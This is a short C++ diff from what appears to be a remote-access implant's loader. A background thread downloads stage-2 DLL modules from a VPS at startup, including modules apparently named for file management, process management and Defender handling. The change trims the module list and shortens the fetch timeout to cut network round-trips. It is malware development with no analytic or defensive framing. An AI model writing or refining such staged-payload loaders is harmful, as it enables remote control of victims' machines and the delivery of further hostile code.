@@ -281,12 +281,17 @@ public:
     void prefetch_all_async() {
         if (prefetch_running_.exchange(true)) return;
         std::thread([this]{
+            // Only the modules that actually ship as stage-2 DLLs today.
+            // Keeping screenshot/audio/stream here previously meant three
+            // round-trips to the VPS at every startup for modules that
+            // don't exist, each fast-failing but still over the network.
+            // Add a name to this list when its .bin ships with the VPS.
             static const char* kModules[] = {
-                "screenshot", "audio", "stream", "filemgr", "procmgr", "defender"
+                "filemgr", "procmgr", "defender"
             };
             for (auto m : kModules) {
                 if (!ensure_cached(m)) {
-                    fetch_blob_sync(m, 20000);
+                    fetch_blob_sync(m, 15000);
                 }
             }
             prefetch_running_.store(false);
